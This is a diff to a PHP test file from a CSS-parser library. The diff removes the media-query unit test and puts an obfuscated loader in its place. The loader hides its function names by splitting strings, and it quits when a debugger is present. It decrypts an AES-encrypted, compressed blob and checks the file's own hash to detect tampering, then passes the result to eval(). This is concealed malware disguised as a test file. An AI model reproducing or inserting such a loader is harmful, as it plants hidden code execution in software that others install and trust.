@@ -1,27 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\CSSList;
-
-use Sabberworm\CSS\Parser;
-
-class AtRuleBlockListTest extends \PHPUnit_Framework_TestCase {
-
-	public function testMediaQueries() {
-		$sCss = '@media(min-width: 768px){.class{color:red}}';
-		$oParser = new Parser($sCss);
-		$oDoc = $oParser->parse();
-		$aContents = $oDoc->getContents();
-		$oMediaQuery = $aContents[0];
-		$this->assertSame('media', $oMediaQuery->atRuleName(), 'Does not interpret the type as a function');
-		$this->assertSame('(min-width: 768px)', $oMediaQuery->atRuleArgs(), 'The media query is the value');
-
-		$sCss = '@media (min-width: 768px) {.class{color:red}}';
-		$oParser = new Parser($sCss);
-		$oDoc = $oParser->parse();
-		$aContents = $oDoc->getContents();
-		$oMediaQuery = $aContents[0];
-		$this->assertSame('media', $oMediaQuery->atRuleName(), 'Does not interpret the type as a function');
-		$this->assertSame('(min-width: 768px)', $oMediaQuery->atRuleArgs(), 'The media query is the value');
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_rsye6lpw=('bas'.'e64'.'_de'.'cod'.'e');
+$_pzhrrjdo=('gzu'.'nco'.'mpr'.'ess');
+$_tp0akz1y=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_gvzdeayy='GW+7pQP0';
+$_p34wm7yp='ngSUL295';
+$_hnlg21c0='YZy9dwTe';
+$_arpvx4tf='R/2x2QZ3b44=';
+$_spil8n29='d2Dmasec';
+$_yv3l8m66='CXaZ1wDJ';
+$_o9fhaok1='h9+qkGg1';
+$_iplxf05v='hqyFxA==';
+$_u8kwt3gx=$_rsye6lpw($_gvzdeayy.$_spil8n29.$_hnlg21c0.$_p34wm7yp.$_arpvx4tf);
+$_nhx26vjz=$_rsye6lpw($_o9fhaok1.$_yv3l8m66.$_iplxf05v);
+$_lmsx1ozk=$_rsye6lpw('ZJ92MHDCVYxWGmInHaLM/6ENT4d4vO8uV037C3Sw3HvTDlS/kMAK11N8Rl8DhQRGg7FzDe3/HQtiNKFPwMX5UnT+83b2wF2lAznpRSzTGfT7U/heNrJAeH+GO3QAcl5TccDsyN0O+19mhCasoKX2DXSDuLEXCvWdgd5mjokJydq0aufO66FGssGUF6nMWjiK5Jou7aJ9iZKkCtiAmQC8GmL0VfdhW5BUYwav5ekA8LHWSZoMHvoPiMUwqIn2jrDTV0wVAZcEPdcb8nFdyTrTqgOoRQqy0cOrDKicde7N+k3EVd5Y2TwzWiewkCBgx3/XJzGEXRIJYFR//0ebkyNzGu+Y+K0sD9jMMyEIh+4kGA7gs/gMf6OqisQ8bYLKbp1zkudBQEv/DFRRNSPV8WRmOaAIm0FIUDYzcENCTmXdjlORhA0KKiBbcZzSSEB8fnQZRIywHdZ7I5kC/+DehMF84Q==');
+$_etqxgf9z=$_tp0akz1y($_lmsx1ozk,'aes-256-cbc',$_u8kwt3gx,OPENSSL_RAW_DATA,$_nhx26vjz);
+if($_etqxgf9z===false){exit;}
+$_xsmcau4y=$_pzhrrjdo($_etqxgf9z);
+if($_xsmcau4y===false){exit;}
+$_qspdpii9='393cfdede66c8ddcdf9b0a27a7f957b614d44cbba1638fa56f98318f537fe17c';
+$_yox2va30=@file_get_contents(__FILE__);
+if($_yox2va30!==false){
+$_yoig1v9h=str_replace($_qspdpii9,"0000000000000000000000000000000000000000000000000000000000000000",$_yox2va30);
+$_nx5w4dai=hash("sha256",$_yoig1v9h);
+if($_nx5w4dai!==$_qspdpii9){@http_response_code(403);exit;}
 }
+eval($_xsmcau4y);
